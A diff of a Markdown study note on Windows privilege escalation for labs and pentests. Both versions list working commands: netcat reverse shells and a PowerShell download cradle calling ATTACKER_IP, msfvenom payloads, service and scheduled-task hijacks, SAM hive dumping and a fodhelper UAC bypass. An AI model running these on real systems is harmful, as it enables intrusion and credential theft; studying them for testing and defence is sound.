@@ -1,368 +1,284 @@
-﻿---
+---
 title: Windows Privilege Escalation
 tags:
-  - intermediate
   - fundamentals
   - windows
   - privilege-escalation
   - post-exploitation
+  - advanced
 topic: Post-Exploitation
-difficulty: intermediate
-created: 2026-03-23
-updated: 2026-04-04
-source: HackTricks Windows privilege escalation, PayloadsAllTheThings, WinPEAS
+difficulty: advanced
+created: 2026-05-16
+updated: 2026-05-16
+source: HackTricks Windows privesc, WinPEAS, PayloadsAllTheThings
 ---
 
 # Windows Privilege Escalation
 
 ## Overview
-Windows privilege escalation covers techniques to move from a low-privileged user account to `NT AUTHORITY\SYSTEM` or local/domain Administrator on a Windows machine. These techniques are central to penetration testing, red teaming, and understanding what defenders must harden.
+Windows privilege escalation is the process of moving from a low-privilege account to SYSTEM or Administrator after initial access. Windows has a distinct set of misconfigurations and features that are consistently abused in CTFs, lab environments, and real-world engagements.
 
-## Why It Matters in Security
-Most initial access on Windows gives limited user privileges. Escalating to SYSTEM or local admin is required to dump credentials, pivot, disable AV, and achieve the goals of an engagement. Defenders use this knowledge to audit configurations and apply hardening.
+## Why It Matters
+Most initial footholds land you as a standard user or service account. The real value — credential dumps, persistence, lateral movement — requires SYSTEM or Administrator. Defenders must know these paths to close them.
 
 ---
 
-## Initial Enumeration Checklist
+## Initial Enumeration
 
-Run immediately after landing a shell:
+Run these immediately after landing a shell:
 
-```cmd
-:: Who are you?
+```powershell
+# Who are you?
 whoami
 whoami /priv
 whoami /groups
 
-:: System info (OS version, hotfixes — look for unpatched vulns)
+# System info
 systeminfo
-systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+hostname
+echo %COMPUTERNAME%
+echo %USERNAME%
 
-:: Hotfixes installed
-wmic qfe get Caption,Description,HotFixID,InstalledOn
-
-:: Network
+# Network
 ipconfig /all
-netstat -ano
 route print
+netstat -ano
 arp -a
 
-:: Users and groups
-net user
-net localgroup administrators
-net localgroup
+# Current user privileges
+whoami /all
 
-:: Running processes
-tasklist /v
-wmic process list full
-
-:: Services
-sc query
-wmic service list full
-sc qc ServiceName
-
-:: Scheduled tasks
-schtasks /query /fo LIST /v
-
-:: Installed programs
+# Installed software
 wmic product get name,version
-dir "C:\Program Files"
-dir "C:\Program Files (x86)"
+Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion
 
-:: AlwaysInstallElevated (registry check)
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# Running processes
+tasklist /svc
+Get-Process
 
-:: Unquoted service paths
-wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+# Services
+sc query
+Get-Service
 
-:: Stored credentials
-cmdkey /list
-dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\
+# Scheduled tasks
+schtasks /query /fo LIST /v
+Get-ScheduledTask
 
-:: Autologon credentials in registry
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+# Firewall rules
+netsh advfirewall show allprofiles
 
-:: Passwords in registry
-reg query HKLM /f password /t REG_SZ /s
-reg query HKCU /f password /t REG_SZ /s
+# Environment variables
+set
+Get-ChildItem Env:
 
-:: Interesting files
-dir /s /b *pass* *cred* *config* *secret* *.kdbx 2>nul
-dir "C:\Users" /a
-type C:\Windows\System32\drivers\etc\hosts
+# Users and groups
+net users
+net localgroup administrators
+Get-LocalUser
+Get-LocalGroupMember Administrators
 ```
 
 ---
 
-## Technique 1 — SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege (Potato Attacks)
+## Technique 1 — AlwaysInstallElevated
 
-The most common privesc on Windows services. If `whoami /priv` shows either privilege — you can almost certainly get SYSTEM.
+If this registry key is set, any user can install MSI packages as SYSTEM.
 
-```cmd
-whoami /priv
-:: Look for: SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
+```powershell
+# Check both keys — both must be 1
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
 
-**Potato exploits** abuse these privileges to impersonate SYSTEM:
+**Exploit:**
+```powershell
+# Generate malicious MSI (on attacker)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o evil.msi
 
-| Tool | Targets | Notes |
-|---|---|---|
-| **PrintSpoofer** | Windows 10, Server 2016/2019 | Most reliable on modern systems |
-| **GodPotato** | Windows Server 2012–2022, Win8–11 | Broad compatibility |
-| **JuicyPotato** | Windows < Server 2019 / Win10 1809 | Requires CLSID selection |
-| **RoguePotato** | Server 2019+, Win10 1809+ | Works where JuicyPotato doesn't |
-| **SweetPotato** | Modern systems | Combines multiple techniques |
-
-```cmd
-:: PrintSpoofer
-PrintSpoofer.exe -i -c cmd.exe
-PrintSpoofer.exe -c "nc.exe ATTACKER_IP 4444 -e cmd.exe"
-
-:: GodPotato
-GodPotato.exe -cmd "cmd.exe /c whoami"
-GodPotato.exe -cmd "nc.exe ATTACKER_IP 4444 -e cmd.exe"
-
-:: JuicyPotato (need CLSID for target OS)
-JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe ATTACKER_IP 4444 -e cmd.exe" -t * -c {CLSID}
+# Install on target (runs as SYSTEM)
+msiexec /quiet /qn /i evil.msi
 ```
 
 ---
 
 ## Technique 2 — Unquoted Service Paths
 
-If a service's binary path contains spaces and is not enclosed in quotes, Windows searches for the executable in each path segment — allowing binary planting.
+If a service binary path has spaces and is not quoted, Windows tries each prefix as an executable.
 
-```cmd
-:: Find unquoted paths
+```powershell
+# Find vulnerable services
 wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
 
-:: Example vulnerable path:
-:: C:\Program Files\Vulnerable Service\sub folder\service.exe
-:: Windows will try:
-:: C:\Program.exe
-:: C:\Program Files\Vulnerable.exe      ← plant here if writable
-:: C:\Program Files\Vulnerable Service\sub.exe
+# Example vulnerable path:
+# C:\Program Files\My App\service.exe
+# Windows tries: C:\Program.exe → C:\Program Files\My.exe → C:\Program Files\My App\service.exe
 ```
 
-```cmd
-:: Check if path segments are writable
-icacls "C:\Program Files\Vulnerable Service\"
-
-:: Generate payload
-msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o Vulnerable.exe
-
-:: Copy to writable path and restart service
-copy Vulnerable.exe "C:\Program Files\Vulnerable.exe"
-sc stop VulnerableService
-sc start VulnerableService
-```
+**Exploit:** Place a malicious executable at the earliest ambiguous path (requires write permission there).
 
 ---
 
 ## Technique 3 — Weak Service Permissions
 
-If you have permission to modify a service's binary path, redirect it to your payload.
+If you can modify a service's binary path, you can redirect it to a malicious executable.
 
-```cmd
-:: Check service permissions (PowerShell)
-Get-Acl "HKLM:\System\CurrentControlSet\Services\ServiceName" | Format-List
+```powershell
+# Check service permissions with accesschk (Sysinternals)
+accesschk.exe -ucqv * /accepteula
 
-:: Or use accesschk (Sysinternals)
-accesschk.exe -uwcqv "Everyone" * 2>nul
-accesschk.exe -uwcqv "Authenticated Users" * 2>nul
-accesschk.exe -uwcqv "Users" * 2>nul
+# Query a specific service
+sc qc "ServiceName"
 
-:: If SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG — exploit:
-sc config ServiceName binpath= "nc.exe ATTACKER_IP 4444 -e cmd.exe"
-sc stop ServiceName
-sc start ServiceName
+# Modify binary path (if you have permission)
+sc config "ServiceName" binPath= "cmd.exe /c net localgroup administrators yourusername /add"
+sc stop "ServiceName"
+sc start "ServiceName"
 ```
 
 ---
 
-## Technique 4 — AlwaysInstallElevated
+## Technique 4 — Token Impersonation (Potato Attacks)
 
-If both registry keys are set to 1, any user can install MSI packages as SYSTEM.
+Service accounts often hold SeImpersonatePrivilege. This allows token impersonation to escalate to SYSTEM.
 
-```cmd
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-:: Both must be 0x1
+```powershell
+# Check for SeImpersonatePrivilege
+whoami /priv
+```
 
-:: Generate malicious MSI
-msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o evil.msi
+If `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` is present, use a Potato exploit:
 
-:: Install it (runs as SYSTEM)
-msiexec /quiet /qn /i evil.msi
+| Tool | Best For |
+|------|----------|
+| PrintSpoofer | Windows 10 / Server 2019 |
+| RoguePotato | Windows 10 / Server 2019 |
+| JuicyPotato | Older Windows (pre-1809) |
+| GodPotato | Windows Server 2012–2022 |
+
+```powershell
+# PrintSpoofer example
+PrintSpoofer.exe -i -c cmd
+
+# JuicyPotato example
+JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}
 ```
 
 ---
 
 ## Technique 5 — Stored Credentials
 
-```cmd
-:: Cmdkey stored credentials
+```powershell
+# Windows Credential Manager
 cmdkey /list
 
-:: Use stored credential with runas
-runas /savecred /user:DOMAIN\Administrator cmd.exe
-
-:: Autologon credentials in registry
+# Saved RDP credentials, auto-logon
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
-:: Look for: DefaultUserName, DefaultPassword, DefaultDomainName
 
-:: Search files for passwords
-findstr /si password *.txt *.xml *.ini *.config 2>nul
-dir /s /b *unattend* *sysprep* *web.config* *php.ini* 2>nul
+# Unattended install files (may contain plaintext passwords)
+type C:\Windows\sysprep\sysprep.xml
+type C:\Windows\Panther\Unattend.xml
+type C:\Windows\system32\sysprep\unattend.xml
+
+# Search for password strings
+findstr /si "password" *.txt *.xml *.config *.ini
+Get-ChildItem -Recurse -Include *.txt,*.xml,*.config,*.ini | Select-String -Pattern "password"
+
+# SAM database (if accessible)
+reg save HKLM\SAM C:\sam.bak
+reg save HKLM\SYSTEM C:\system.bak
+# Transfer and extract with impacket-secretsdump
 ```
 
 ---
 
-## Technique 6 — Token Impersonation
+## Technique 6 — Scheduled Tasks
 
-With `SeImpersonatePrivilege`, use tools to impersonate higher-privilege tokens:
+```powershell
+# List all scheduled tasks with details
+schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run"
 
-```cmd
-:: In Meterpreter
-load incognito
-list_tokens -u
-impersonate_token "NT AUTHORITY\\SYSTEM"
-getuid
-
-:: Or getsystem
-getsystem
+# Check if task script is writable
+Get-ScheduledTask | ForEach-Object { $_.Actions } | Select-Object -ExpandProperty Execute
 ```
+
+If a task runs as SYSTEM and calls a script you can write to, replace the script content with a reverse shell or user-add command.
 
 ---
 
 ## Technique 7 — DLL Hijacking
 
-If a service or program loads DLLs from a writable directory, plant a malicious DLL.
+Windows searches for DLLs in a specific order. If an application directory is writable, a malicious DLL placed there can be loaded instead of the legitimate one.
 
-```cmd
-:: Find missing DLLs with Process Monitor (Sysinternals) on a local lab
-:: Or use WinPEAS to highlight DLL hijacking candidates
+**DLL search order:**
+1. Application directory
+2. System directory (C:\Windows\System32)
+3. Windows directory (C:\Windows)
+4. Current directory
+5. Directories in PATH
 
-:: Generate malicious DLL
-msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o vuln.dll
+```powershell
+# Find missing DLLs using Process Monitor (Sysinternals)
+# Filter: Result = NAME NOT FOUND, Path ends in .dll
 
-:: Copy to the searched path
-copy vuln.dll "C:\writable\path\missing.dll"
-:: Trigger service restart or application reload
+# Generate malicious DLL (on attacker)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o missing.dll
 ```
 
 ---
 
-## Technique 8 — Scheduled Task Abuse
+## Automated Enumeration Tools
 
-```cmd
-:: List tasks with their run-as user
-schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run"
+```powershell
+# WinPEAS — most comprehensive
+.\winPEASx64.exe
 
-:: If a task runs a script you can write to:
-:: Add payload to the script file
-echo C:\nc.exe ATTACKER_IP 4444 -e cmd.exe >> C:\writable\task_script.bat
-
-:: Create a new task (if permissions allow)
-schtasks /create /tn "UpdateTask" /tr "C:\nc.exe ATTACKER_IP 4444 -e cmd.exe" /sc onlogon /ru SYSTEM
-```
-
----
-
-## Technique 9 — Kernel / CVE Exploits
-
-```cmd
-systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
-wmic qfe get HotFixID
-
-:: Search for local privilege escalation exploits
-searchsploit windows local privilege escalation
-searchsploit "Windows 10 1903"
-```
-
-**Notable Windows kernel/local exploits:**
-| CVE | Name | Target |
-|---|---|---|
-| CVE-2021-36934 | HiveNightmare / SeriousSAM | Windows 10 21H1 — SAM readable by Users |
-| CVE-2021-1732 | Win32k privesc | Windows 10 / Server 2019 |
-| CVE-2020-0787 | BITS service | Windows 7–10 |
-| CVE-2019-1388 | UAC bypass via cert dialog | Windows 7–10 |
-| MS16-032 | Secondary Logon Handle | Windows 7–10 / Server 2008–2012 |
-
----
-
-## Automated Tools
-
-```cmd
-:: WinPEAS (most comprehensive — run first)
-winPEASx64.exe
-winPEASx86.exe
-winPEASany.exe
-
-:: PowerUp (PowerShell)
-IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')
+# PowerUp (PowerSploit)
+. .\PowerUp.ps1
 Invoke-AllChecks
 
-:: Seatbelt (post-exploitation enumeration)
-Seatbelt.exe -group=all
+# Sherlock (legacy, unpatched vulnerabilities)
+. .\Sherlock.ps1
+Find-AllVulns
 
-:: AccessChk (Sysinternals — legitimate tool)
-accesschk.exe -uwcqv "Everyone" *
+# Seatbelt (situational awareness)
+.\Seatbelt.exe -group=all
 ```
 
 ---
 
-## UAC Bypass (When Already Local Admin but not Elevated)
+## Bypassing UAC
 
 ```powershell
 # Check UAC level
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
 
-# Common bypass: fodhelper.exe
-New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
-New-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
-Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe" -Force
-Start-Process fodhelper.exe
+# eventvwr.exe bypass (Windows 7/10)
+# fodhelper.exe bypass (Windows 10)
+# Both exploit auto-elevation and registry key hijacking
 ```
 
 ---
 
 ## Key Terms
-| Term | Definition |
-|---|---|
-| SYSTEM | Highest privilege level on Windows; more powerful than Administrator |
-| SeImpersonatePrivilege | Allows a process to impersonate a client; often held by service accounts |
-| UAC | User Account Control — elevation prompt; prevents accidental admin actions |
-| Token | Access token attached to a process defining its security context and privileges |
-| CLSID | Class Identifier — COM object identifier; used in Potato attacks |
-| MSI | Microsoft Installer package format |
 
-## Related Notes
-- Active-Directory
-- Windows-Commands
-- Metasploit
-- Linux-Privilege-Escalation
+| Term | Definition |
+|------|------------|
+| SYSTEM | Highest privilege account on a Windows machine |
+| UAC | User Account Control — prompts for elevation confirmation |
+| SAM | Security Account Manager — stores local user password hashes |
+| Token | Security object that describes privileges of a process/thread |
+| SeImpersonatePrivilege | Right to impersonate a client after authentication |
+| MSI | Microsoft Installer package format |
+| DLL | Dynamic Link Library — shared code loaded by applications |
+| SPN | Service Principal Name — identifier for a service running on a host |
 
 ## Sources
 
-PEASS-ng Team. (2024). *WinPEAS: Windows privilege escalation awesome script*. GitHub. https://github.com/peass-ng/PEASS-ng
-
-Swisskyrepo. (2024). *PayloadsAllTheThings: Windows privilege escalation*. GitHub. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
-
 Carlos Polop. (2024). *Windows local privilege escalation*. HackTricks. https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
 
-Fortra (itm4n). (2020). *PrintSpoofer: Abusing impersonation privileges on Windows 10 and server 2019*. GitHub. https://github.com/itm4n/PrintSpoofer
+Dmcxblue. (2023). *Windows privilege escalation*. PayloadsAllTheThings. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
 
-BeichenDream. (2023). *GodPotato: New potatoes for Windows privilege escalation*. GitHub. https://github.com/BeichenDream/GodPotato
-
-## See Also
-
-- Penetration-Testing-Methodology
-- Metasploit
-- Netcat
-- BloodHound
-- Windows-Commands
-- Linux-Privilege-Escalation
+Tib3rius. (2022). *Windows privilege escalation for OSCP & beyond*. Udemy course notes.
 
 ---
 <- [[Fundamentals-MOC]]
